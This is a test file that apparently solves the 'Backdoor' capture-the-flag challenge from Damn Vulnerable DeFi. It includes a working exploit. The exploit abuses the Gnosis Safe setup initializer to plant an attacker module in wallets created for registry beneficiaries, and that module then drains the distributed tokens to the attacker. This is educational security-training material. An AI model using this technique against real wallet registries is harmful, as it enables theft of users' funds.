const { ethers } = require('hardhat');
const { expect } = require('chai');

describe('[Challenge] Backdoor', function () {
    let deployer, users, attacker;

    const AMOUNT_TOKENS_DISTRIBUTED = ethers.utils.parseEther('40');

    before(async function () {
        /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */
        [deployer, alice, bob, charlie, david, attacker] = await ethers.getSigners();
        users = [alice.address, bob.address, charlie.address, david.address]

        // Deploy Gnosis Safe master copy and factory contracts
        this.masterCopy = await (await ethers.getContractFactory('GnosisSafe', deployer)).deploy();
        this.walletFactory = await (await ethers.getContractFactory('GnosisSafeProxyFactory', deployer)).deploy();
        this.token = await (await ethers.getContractFactory('DamnValuableToken', deployer)).deploy();
        
        // Deploy the registry
        this.walletRegistry = await (await ethers.getContractFactory('WalletRegistry', deployer)).deploy(
            this.masterCopy.address,
            this.walletFactory.address,
            this.token.address,
            users
        );

        // Users are registered as beneficiaries
        for (let i = 0; i < users.length; i++) {
            expect(
                await this.walletRegistry.beneficiaries(users[i])
            ).to.be.true;            
        }

        // Transfer tokens to be distributed to the registry
        await this.token.transfer(this.walletRegistry.address, AMOUNT_TOKENS_DISTRIBUTED);
    });

    it('Exploit', async function () {
        // we can create a gnosis safe wallet with the user as the onwer and
        // register a module in the wallet to steal the funds
        const hackModule = await (await ethers.getContractFactory('HackModule', attacker)).deploy();
        const setupData = hackModule.interface.encodeFunctionData("setup", [hackModule.address]);

        for(let i = 0; i < users.length; i++) {
            const user = users[i];

            const initializer = this.masterCopy.interface.encodeFunctionData("setup", [
                [user], // owners
                1, // _threshold
                hackModule.address, // to
                setupData, // data
                ethers.constants.AddressZero, // fallbackHandler
                ethers.constants.AddressZero, // paymentToken
                0, // payment
                ethers.constants.AddressZero, // paymentReceiver
              ])

            const tx = await this.walletFactory.connect(attacker).createProxyWithCallback(
                this.masterCopy.address,
                initializer,
                0,
                this.walletRegistry.address,
            )
            const txData = await tx.wait();

            const proxyCreationEvent = txData.events.find(x => x.event == 'ProxyCreation');
            const proxyAddress = proxyCreationEvent.args.proxy;

            await hackModule.hack(proxyAddress, this.token.address, attacker.address);
        }
    });

    after(async function () {
        /** SUCCESS CONDITIONS */
        for (let i = 0; i < users.length; i++) {
            let wallet = await this.walletRegistry.wallets(users[i]);
            
            // User must have registered a wallet
            expect(wallet).to.not.eq(ethers.constants.AddressZero, "User did not register a wallet");

            // User is no longer registered as a beneficiary
            expect(
                await this.walletRegistry.beneficiaries(users[i])
            ).to.be.false;
        }

        // Attacker must have taken all tokens
        expect(
            await this.token.balanceOf(attacker.address)
        ).to.eq(AMOUNT_TOKENS_DISTRIBUTED);
    });
});
